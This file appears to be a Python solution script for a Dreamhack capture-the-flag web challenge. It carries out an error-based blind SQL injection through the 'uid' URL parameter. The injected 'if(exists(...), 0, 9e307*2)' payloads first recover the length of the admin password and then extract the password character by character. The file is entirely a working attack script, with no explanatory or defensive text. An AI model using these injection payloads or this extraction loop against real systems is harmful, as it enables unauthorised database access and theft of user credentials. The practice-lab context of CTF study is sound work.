import requests, string

port = 16247
url_index = f"http://host1.dreamhack.games:{port}/"
uid = "admin"

# find the length of flag
length = 0
while True:
    url_temp = url_index
    sql_cmd = f"' and if(exists(select * from user where uid='{uid}' and char_length(upw)={length}), 0, 9e307*2) -- "
    url_temp += f"?uid={sql_cmd}"
    response = requests.get(url_temp)
    if "pre" in response.text:
        break
    length += 1

print(length)

candidate = string.ascii_letters + string.digits + string.punctuation
password = ""

for i in range(length):
    for letter in candidate:
        url_temp = url_index
        sql_cmd = f"' and if(exists(select * from user where uid='{uid}' and substr(upw, {i + 1}, 1)='{letter}'), 0, 9e307*2) -- "
        url_temp += f"?uid={sql_cmd}"
        response = requests.get(url_temp)
        if "pre" in response.text:
            password += letter
            print(letter)
            break

print(password)
